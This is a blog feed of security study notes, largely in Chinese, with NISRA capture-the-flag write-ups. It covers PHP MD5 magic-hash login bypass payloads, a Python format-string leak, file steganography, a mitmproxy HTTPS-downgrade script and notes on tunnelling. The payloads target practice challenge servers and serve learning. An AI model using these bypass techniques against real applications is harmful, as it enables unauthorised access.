 &lt;a class="anchor" href="#overall">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://aperisolve.fr/">All stego decrypt tools&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://tools.miku.ac/">All stego encrypt tools&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.ctftools.com/">ctf tool&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://w1a2d3s4q5e6.blogspot.com/2016/06/blog-post.html">Other people&amp;rsquo;s note&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>MITMProxy相關問題整理</title><link>https://bernie6401.github.io/docs/problem-solutions/mitmproxy%E7%9B%B8%E9%97%9C%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/mitmproxy%E7%9B%B8%E9%97%9C%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/</guid><description>&lt;h1 id="mitmproxy相關問題整理">
 MITMProxy相關問題整理
 &lt;a class="anchor" href="#mitmproxy%e7%9b%b8%e9%97%9c%e5%95%8f%e9%a1%8c%e6%95%b4%e7%90%86">#&lt;/a>
&lt;/h1>
&lt;p>資料來源: &lt;a href="https://github.com/mitmproxy/mitmproxy/issues/5442">https://github.com/mitmproxy/mitmproxy/issues/5442&lt;/a>&lt;/p>
&lt;h2 id="server-tls-handshake-failed-the-remote-server-does-not-speak-tls">
 Server TLS handshake failed. The remote server does not speak TLS.
 &lt;a class="anchor" href="#server-tls-handshake-failed-the-remote-server-does-not-speak-tls">#&lt;/a>
&lt;/h2>
&lt;p>代表連線的標的無法處理https的scheme，如果確定連線的目標是開在localhost或是一定是http scheme的話，可以利用script去hook流量把https改掉&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">from mitmproxy import http

def request(flow: http.HTTPFlow) -&amp;gt; None:
 # 檢查請求是否是 HTTPS
 if flow.request.scheme == &amp;#34;https&amp;#34;:
 # 將 URL 中的 HTTPS 替換為 HTTP
 flow.request.url = flow.request.url.replace(&amp;#39;https://&amp;#39;, &amp;#39;http://&amp;#39;)
&lt;/code>&lt;/pre>&lt;h2 id="unable-to-establish-tls-connection-with-server-the-remote-server-does-not-speak-tls-trying-to-establish-tls-with-client-anyway-if-you-plan-to-redirect-requests-away-from-this-server-consider-setting-connection_strategy-to-lazy-to-suppress-early-connections">
 Unable to establish TLS connection with server (The remote server does not speak TLS.). Trying to establish TLS with client anyway. If you plan to redirect requests away from this server, consider setting &lt;code>connection_strategy&lt;/code> to &lt;code>lazy&lt;/code> to suppress early connections.
 &lt;a class="anchor" href="#unable-to-establish-tls-connection-with-server-the-remote-server-does-not-speak-tls-trying-to-establish-tls-with-client-anyway-if-you-plan-to-redirect-requests-away-from-this-server-consider-setting-connection_strategy-to-lazy-to-suppress-early-connections">#&lt;/a>
&lt;/h2>
&lt;p>出現這個warning，&lt;/p></description></item><item><title>Network Related</title><link>https://bernie6401.github.io/docs/terminology/network-related/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/terminology/network-related/</guid><description>&lt;h1 id="what-is-httpssh-tunnel-tlsssl-websocket">
 What is HTTP/SSH Tunnel, TLS/SSL, WebSocket?
 &lt;a class="anchor" href="#what-is-httpssh-tunnel-tlsssl-websocket">#&lt;/a>
&lt;/h1>
&lt;p>在讀When TLS Meets Proxy on Mobile&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>這篇paper的時候一直提到這些觀念，有時候會差點搞混中間的意思&lt;/p>
&lt;h2 id="ssl-tunnel">
 SSL Tunnel
 &lt;a class="anchor" href="#ssl-tunnel">#&lt;/a>
&lt;/h2>
&lt;p>根據&lt;a href="https://johnliu55.tw/ssh-tunnel.html">SSH Tunneling (Port Forwarding) 詳解 &lt;/a>的說明:&lt;/p>
&lt;blockquote>
&lt;p>Tunneling 指的是將網路上的 A、B 兩個端點用某種方式連接起來，形成一個「隧道」，讓兩端的通訊能夠穿透某些限制（例如防火牆），或是能將通訊內容加密避免洩漏。而 SSH Tunneling 就是指利用 SSH 協定來建立這個隧道
![](&lt;a href="https://johnliu55.tw/ssh-tunnel/images/tunneling.png">https://johnliu55.tw/ssh-tunnel/images/tunneling.png&lt;/a> =400x)&lt;/p>&lt;/blockquote>
&lt;p>有分成以下三種，以下接取自&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>的說明，但不特別解釋，原文也有補充很多實際如何使用的Command和教學&lt;/p>
&lt;ul>
&lt;li>Local Port Forwarding
&lt;ul>
&lt;li>使用情境一：連到位在防火牆後的開發伺服器上的服務
![](&lt;a href="https://johnliu55.tw/ssh-tunnel/images/local_scenario1_problem.png">https://johnliu55.tw/ssh-tunnel/images/local_scenario1_problem.png&lt;/a> =400x)
![](&lt;a href="https://johnliu55.tw/ssh-tunnel/images/local_scenario1_solved.png">https://johnliu55.tw/ssh-tunnel/images/local_scenario1_solved.png&lt;/a> =400x)&lt;/li>
&lt;li>使用情境二：透過防火牆後的機器，連到防火牆後的特定服務
![](&lt;a href="https://johnliu55.tw/ssh-tunnel/images/local_scenario2_problem.png">https://johnliu55.tw/ssh-tunnel/images/local_scenario2_problem.png&lt;/a> =400x)
![](&lt;a href="https://johnliu55.tw/ssh-tunnel/images/local_scenario2_solved.png">https://johnliu55.tw/ssh-tunnel/images/local_scenario2_solved.png&lt;/a> =400x)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Remote Port Forwarding
&lt;ul>
&lt;li>使用情境一：透過對外機器，讓其他人能夠連到你的電腦上的服務
![](&lt;a href="https://johnliu55.tw/ssh-tunnel/images/remote_scenario1_problem.png">https://johnliu55.tw/ssh-tunnel/images/remote_scenario1_problem.png&lt;/a> =400x)
![](&lt;a href="https://johnliu55.tw/ssh-tunnel/images/remote_scenario1_solved.png">https://johnliu55.tw/ssh-tunnel/images/remote_scenario1_solved.png&lt;/a> =400x)&lt;/li>
&lt;li>使用情境二：透過對外機器，從外面連回內部網路上的服務
![](&lt;a href="https://johnliu55.tw/ssh-tunnel/images/remote_scenario2_problem.png">https://johnliu55.tw/ssh-tunnel/images/remote_scenario2_problem.png&lt;/a> =400x)
![](&lt;a href="https://johnliu55.tw/ssh-tunnel/images/remote_scenario2_solved.png">https://johnliu55.tw/ssh-tunnel/images/remote_scenario2_solved.png&lt;/a> =400x)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Dynamic Port Forwarding
&lt;ul>
&lt;li>使用情境：建立一個 HTTP 代理伺服器連到內網的所有 HTTP(S) 服務
![](&lt;a href="https://johnliu55.tw/ssh-tunnel/images/dynamic.png">https://johnliu55.tw/ssh-tunnel/images/dynamic.png&lt;/a> =400x)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="http-tunnel">
 HTTP Tunnel
 &lt;a class="anchor" href="#http-tunnel">#&lt;/a>
&lt;/h2>
&lt;p>根據&lt;a href="http://www.wiseuc.com/facontent.php?id=903">http tunnel 原理及穿透防火牆方法&lt;/a>中提到的說明，其實和上述的SSH Tunnel的原理和功能差不多，只是建立tunnel的Port變成HTTP的80為主&lt;/p></description></item><item><title>NISRA - different places</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---different-places/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---different-places/</guid><description>&lt;h1 id="nisra---different-places">
 NISRA - different places
 &lt;a class="anchor" href="#nisra---different-places">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-nisra-ctf-web">
 tags: &lt;code>NISRA&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-nisra-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://chall2.nisra.net:41025/">different places&lt;/a>&lt;/p>
&lt;h2 id="exploit---integrate-fragments-flags">
 Exploit - Integrate Fragments Flags
 &lt;a class="anchor" href="#exploit---integrate-fragments-flags">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>View Page Sources
&lt;img src="https://i.imgur.com/q3tSKo5.png" alt="" />
&lt;img src="https://i.imgur.com/yrKjnyr.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>base64 decode
&lt;code>dXNlcm5hbWU6YWRtaW5fcGFzc3dvcmQ6bmlzcmE=&lt;/code> $\to$ &lt;code>username:admin_password:nisra&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Observe the form
It uses get method to fetch the parameters. So we can peek &lt;code>login.php&lt;/code> first.
&lt;img src="https://i.imgur.com/oGFwOoA.png" alt="" />
Then we could use the username and password we got at previous step.
Payload: &lt;code>view-source:http://chall2.nisra.net:41025/login.php?username=admin&amp;amp;password=nisra&lt;/code>
Then we got the last fragment flag.&lt;/p></description></item><item><title>NISRA - Hidden?</title><link>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra---hidden_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra---hidden_/</guid><description>&lt;h1 id="nisra---hidden">
 NISRA - Hidden?
 &lt;a class="anchor" href="#nisra---hidden">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/uwox6r5hQ6St_8G-4mv1_g">advanced-potion-making:two::+1:&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題也是蠻巧妙的，用pngcheck可以看到檔案有問題&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ pngcheck haha.png
haha.png additional data after IEND chunk
ERROR: haha.png
&lt;/code>&lt;/pre>&lt;h2 id="exploit---recover--unzip">
 Exploit - Recover + Unzip
 &lt;a class="anchor" href="#exploit---recover--unzip">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Recover PNG File
先找文件尾（00 00 00 00 49 45 4E 44 AE 42 60 82）
&lt;img src="https://hackmd.io/_uploads/SySm_6DO3.png" alt="" />
發現後續還有其他bytes，用&lt;a href="https://en.wikipedia.org/wiki/List_of_file_signatures">list signature&lt;/a>追查後面是甚麼，&lt;img src="https://hackmd.io/_uploads/Hy-5OpPOh.png" alt="" />
發現應該是個zip file，所以獨立出來後解壓縮&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Unzip
解壓縮後有一些文件，從裡面撈了一下flag就在./word/document.xml中
Flag: &lt;code>NISRA{Oop5!_yoU_fOuNd_1t}&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://hackmd.io/_uploads/BkLoDTwO3.png" alt="" />&lt;/p></description></item><item><title>NISRA - MD5_1</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_1/</guid><description>&lt;h1 id="nisra---md5_1">
 NISRA - MD5_1
 &lt;a class="anchor" href="#nisra---md5_1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-nisra-ctf-web">
 tags: &lt;code>NISRA&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-nisra-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://chall2.nisra.net:41022/">MD5_1&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
 highlight_file(__FILE__);
 $FROM_INCLUDE = true;
 include(&amp;#34;flag.php&amp;#34;);
 $msg = &amp;#34;&amp;#34;;
 if (isset($_GET[&amp;#39;user&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;password&amp;#39;])) {
 $user = $_GET[&amp;#39;user&amp;#39;];
 $password = $_GET[&amp;#39;password&amp;#39;];
 $check = &amp;#34;QNKCDZO&amp;#34;;
 // the md5 of &amp;#34;QNKCDZO&amp;#34; is 0e830400451993494058024219903391

 if ($user == &amp;#34;admin&amp;#34; &amp;amp;&amp;amp; $password != $check &amp;amp;&amp;amp; md5($password) == md5($check)) {
 $msg = &amp;#34;Flag: &amp;#34;.$flag;
 } else {
 $msg = &amp;#34;Keep trying!&amp;#34;;
 }
 }

 echo $msg;
?&amp;gt; 
&lt;/code>&lt;/pre>&lt;h2 id="exploit---md5-collision">
 Exploit - MD5 Collision
 &lt;a class="anchor" href="#exploit---md5-collision">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>http://chall2.nisra.net:41022/?user=admin&amp;amp;password=240610708&lt;/code>
:::spoiler flag
&lt;code>Flag: NISRA{PhP_is_th3_BeST_laNgUA9E}&lt;/code>
:::&lt;/p></description></item><item><title>NISRA - MD5_2</title><link>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/web/nisra---md5_2/</guid><description>&lt;h1 id="nisra---md5_2">
 NISRA - MD5_2
 &lt;a class="anchor" href="#nisra---md5_2">#&lt;/a>
&lt;/h1>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>curl http://chall2.nisra.net:41023/ -H &amp;quot;Content-Type: application/x-www-form-urlencoded&amp;quot; -X POST -d &amp;quot;user=240610708&amp;amp;password=QNKCDZO&amp;quot;&lt;/code>
Flag: &lt;code>NISRA{S3CuR17y_1ssuEs_Of_pHP_@ND_Md5}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://news.ycombinator.com/item?id=9484757">md5(&amp;lsquo;240610708&amp;rsquo;) == md5(&amp;lsquo;QNKCDZO&amp;rsquo;)&lt;/a>&lt;/p></description></item><item><title>NISRA 2023 Enlightened - Jack的flag</title><link>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra-2023-enlightened---jack%E7%9A%84flag/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra-2023-enlightened---jack%E7%9A%84flag/</guid><description>&lt;h1 id="nisra-2023-enlightened---jack的flag">
 NISRA 2023 Enlightened - Jack的flag
 &lt;a class="anchor" href="#nisra-2023-enlightened---jack%e7%9a%84flag">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Microsoft Word Forensics&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這是第一次寫到有關word的隱寫，蠻特別的就紀錄一下，但看得出來應該是考古古古古古古題了ㄅ&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>有兩種方法&lt;/p>
&lt;ol>
&lt;li>強制解壓縮
直接把副檔名改成.zip，然後用解壓縮軟體解壓縮，接著就可以在&lt;code>Final-Jack\word\document.xml&lt;/code>中可以找到flag&lt;/li>
&lt;li>把隱藏設定打開
直接在word中的&lt;code>檔案/選項/顯示/隱藏文字&lt;/code>的方塊打勾，就可以直接在下面看到flag了&lt;/li>
&lt;/ol>
&lt;p>Flag: &lt;code>NISRA{Word'$_h1Dden_7eXT_reVEaLed}&lt;/code>&lt;/p></description></item><item><title>NISRA 2023 Enlightened - Magic Function</title><link>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra-2023-enlightened---magic-function/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra-2023-enlightened---magic-function/</guid><description>&lt;h1 id="nisra-2023-enlightened---magic-function">
 NISRA 2023 Enlightened - Magic Function
 &lt;a class="anchor" href="#nisra-2023-enlightened---magic-function">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hacktricks.boitatech.com.br/misc/basic-python/magic-methods">Magic Function of Python&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">class Test():
	def __init__(self, email=&amp;#39;test@nisra.net&amp;#39;):
		self.info = &amp;#39;test&amp;#39;
		self.email = email

class Secret():
	flag = open(&amp;#34;./NISRA-Enlightened-2023/flag.txt&amp;#34;, &amp;#34;r&amp;#34;).read().strip()


if __name__ == &amp;#39;__main__&amp;#39;:
	email = input(&amp;#39;Your email: &amp;#39;)

	if email:
		test = Test(email)
	else:
		test = Test()

	msg = (&amp;#39;this is for {test.info}, please contact &amp;#39; + email + &amp;#39;.&amp;#39;).format(test=test)

	print(msg)
&lt;/code>&lt;/pre>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題真的很有趣，但也是算通靈的奇淫怪招，仔細看了一下直覺應該是跟format string有關係，比賽的時候的確有想到，但我當時想的payload有點偏掉了，當時的payload是: &lt;code>{test.email}.format(test=Test(Secret().flag))&lt;/code>，也就是先傳入Secret().flag給Test這個class，然後再利用format傳入給&lt;/p></description></item><item><title>NISRA 2023 Enlightened - Pixel</title><link>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra-2023-enlightened---pixel/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/nisra/misc/nisra-2023-enlightened---pixel/</guid><description>&lt;h1 id="nisra-2023-enlightened---pixel">
 NISRA 2023 Enlightened - Pixel
 &lt;a class="anchor" href="#nisra-2023-enlightened---pixel">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/HkF8f_702.png" alt="" />&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題真的很難，應該說有想過，不過很麻煩就是了，每一個色塊都有一組RGB的數值，然後只要把它轉換成ASCII，再把每一個字元串起來，就會是一組base64的code，轉換之後就拿到一組ciphertext，接著就丟到cyberchef看看一般的工具可不可以解，最後是用rot13解出來，除了最一開始的地方需要一點通靈之外，其他都很簡單，但&amp;hellip;寫script頗麻煩&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> PIL &lt;span style="color:#f92672">import&lt;/span> Image
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> base64 &lt;span style="color:#f92672">import&lt;/span> b64decode
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>img &lt;span style="color:#f92672">=&lt;/span> Image&lt;span style="color:#f92672">.&lt;/span>open(&lt;span style="color:#e6db74">&amp;#34;./NISRA-Enlightened-2023/Misc/Final-Pixel.png&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pixels &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> row &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">8&lt;/span>):	&lt;span style="color:#75715e"># 8 rows&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> col &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">8&lt;/span>):	&lt;span style="color:#75715e"># 8 columns&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		r, g, b &lt;span style="color:#f92672">=&lt;/span> img&lt;span style="color:#f92672">.&lt;/span>getpixel((row &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>, col &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>))	&lt;span style="color:#75715e"># each grid: 64 x 64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> r &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span> &lt;span style="color:#f92672">and&lt;/span> g &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span> &lt;span style="color:#f92672">and&lt;/span> b &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			pixels&lt;span style="color:#f92672">.&lt;/span>append((chr(r), chr(g), chr(b)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> r &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span> &lt;span style="color:#f92672">and&lt;/span> g &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span> &lt;span style="color:#f92672">and&lt;/span> b &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">255&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(pixels)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> r, g, b &lt;span style="color:#f92672">in&lt;/span> pixels:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	flag &lt;span style="color:#f92672">+=&lt;/span> r &lt;span style="color:#f92672">+&lt;/span> g &lt;span style="color:#f92672">+&lt;/span> b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(flag)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(b64decode(flag&lt;span style="color:#f92672">.&lt;/span>encode()))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ python exp.py
[(&amp;#39;c&amp;#39;, &amp;#39;3&amp;#39;, &amp;#39;l&amp;#39;), (&amp;#39;u&amp;#39;, &amp;#39;d&amp;#39;, &amp;#39;D&amp;#39;), (&amp;#39;o&amp;#39;, &amp;#39;g&amp;#39;, &amp;#39;Q&amp;#39;), (&amp;#39;V&amp;#39;, &amp;#39;Z&amp;#39;, &amp;#39;G&amp;#39;), (&amp;#39;R&amp;#39;, &amp;#39;U&amp;#39;, &amp;#39;5&amp;#39;), (&amp;#39;7&amp;#39;, &amp;#39;T&amp;#39;, &amp;#39;l&amp;#39;), (&amp;#39;9&amp;#39;, &amp;#39;l&amp;#39;, &amp;#39;T&amp;#39;), (&amp;#39;m&amp;#39;, &amp;#39;Y&amp;#39;, &amp;#39;3&amp;#39;), (&amp;#39;U&amp;#39;, &amp;#39;k&amp;#39;, &amp;#39;V&amp;#39;), (&amp;#39;f&amp;#39;, &amp;#39;N&amp;#39;, &amp;#39;k&amp;#39;), (&amp;#39;U&amp;#39;, &amp;#39;0&amp;#39;, &amp;#39;Q&amp;#39;), (&amp;#39;1&amp;#39;, &amp;#39;U&amp;#39;, &amp;#39;x&amp;#39;), (&amp;#39;U&amp;#39;, &amp;#39;F&amp;#39;, &amp;#39;9&amp;#39;), (&amp;#39;l&amp;#39;, &amp;#39;U&amp;#39;, &amp;#39;m&amp;#39;), (&amp;#39;N&amp;#39;, &amp;#39;F&amp;#39;, &amp;#39;U&amp;#39;), (&amp;#39;m&amp;#39;, &amp;#39;Z&amp;#39;, &amp;#39;S&amp;#39;), (&amp;#39;Q&amp;#39;, &amp;#39;W&amp;#39;, &amp;#39;c&amp;#39;), (&amp;#39;k&amp;#39;, &amp;#39;X&amp;#39;, &amp;#39;0&amp;#39;), (&amp;#39;5&amp;#39;, &amp;#39;f&amp;#39;, &amp;#39;R&amp;#39;), (&amp;#39;2&amp;#39;, &amp;#39;o&amp;#39;, &amp;#39;w&amp;#39;), (&amp;#39;L&amp;#39;, &amp;#39;V&amp;#39;, &amp;#39;E&amp;#39;), (&amp;#39;x&amp;#39;, &amp;#39;W&amp;#39;, &amp;#39;j&amp;#39;), (&amp;#39;N&amp;#39;, &amp;#39;h&amp;#39;, &amp;#39;Z&amp;#39;), (&amp;#39;j&amp;#39;, &amp;#39;E&amp;#39;, &amp;#39;w&amp;#39;), (&amp;#39;Y&amp;#39;, &amp;#39;T&amp;#39;, &amp;#39;Q&amp;#39;), (&amp;#39;x&amp;#39;, &amp;#39;X&amp;#39;, &amp;#39;2&amp;#39;), (&amp;#39;N&amp;#39;, &amp;#39;2&amp;#39;, &amp;#39;c&amp;#39;), (&amp;#39;G&amp;#39;, &amp;#39;d&amp;#39;, &amp;#39;o&amp;#39;), (&amp;#39;R&amp;#39;, &amp;#39;X&amp;#39;, &amp;#39;J&amp;#39;), (&amp;#39;f&amp;#39;, &amp;#39;T&amp;#39;, &amp;#39;m&amp;#39;), (&amp;#39;Z&amp;#39;, &amp;#39;f&amp;#39;, &amp;#39;N&amp;#39;), (&amp;#39;F&amp;#39;, &amp;#39;9&amp;#39;, &amp;#39;l&amp;#39;), (&amp;#39;U&amp;#39;, &amp;#39;n&amp;#39;, &amp;#39;B&amp;#39;), (&amp;#39;H&amp;#39;, &amp;#39;b&amp;#39;, &amp;#39;m&amp;#39;), (&amp;#39;E&amp;#39;, &amp;#39;2&amp;#39;, &amp;#39;S&amp;#39;), (&amp;#39;D&amp;#39;, &amp;#39;F&amp;#39;, &amp;#39;O&amp;#39;), (&amp;#39;R&amp;#39;, &amp;#39;V&amp;#39;, &amp;#39;9&amp;#39;), (&amp;#39;a&amp;#39;, &amp;#39;b&amp;#39;, &amp;#39;j&amp;#39;), (&amp;#39;d&amp;#39;, &amp;#39;l&amp;#39;, &amp;#39;d&amp;#39;), (&amp;#39;m&amp;#39;, &amp;#39;t&amp;#39;, &amp;#39;f&amp;#39;), (&amp;#39;Y&amp;#39;, &amp;#39;m&amp;#39;, &amp;#39;V&amp;#39;), (&amp;#39;f&amp;#39;, &amp;#39;d&amp;#39;, &amp;#39;G&amp;#39;), (&amp;#39;V&amp;#39;, &amp;#39;W&amp;#39;, &amp;#39;c&amp;#39;), (&amp;#39;V&amp;#39;, &amp;#39;9&amp;#39;, &amp;#39;i&amp;#39;), (&amp;#39;U&amp;#39;, &amp;#39;1&amp;#39;, &amp;#39;9&amp;#39;), (&amp;#39;G&amp;#39;, &amp;#39;Z&amp;#39;, &amp;#39;E&amp;#39;), (&amp;#39;h&amp;#39;, &amp;#39;A&amp;#39;, &amp;#39;Z&amp;#39;), (&amp;#39;V&amp;#39;, &amp;#39;J&amp;#39;, &amp;#39;f&amp;#39;), (&amp;#39;Q&amp;#39;, &amp;#39;1&amp;#39;, &amp;#39;Z&amp;#39;), (&amp;#39;L&amp;#39;, &amp;#39;c&amp;#39;, &amp;#39;n&amp;#39;), (&amp;#39;l&amp;#39;, &amp;#39;m&amp;#39;, &amp;#39;f&amp;#39;), (&amp;#39;Q&amp;#39;, &amp;#39;=&amp;#39;, &amp;#39;=&amp;#39;)]
c3ludDogQVZGRU57Tl9lTmY3UkVfNkU0Q1UxUF9lUmNFUmZSQWckX05fR2owLVExWjNhZjEwYTQxX2N2cGdoRXJfTmZfNF9lUnBHbmE2SDFORV9abjdldmtfYmVfdGVWcV9iU19GZEhAZVJfQ1ZLcnlmfQ==
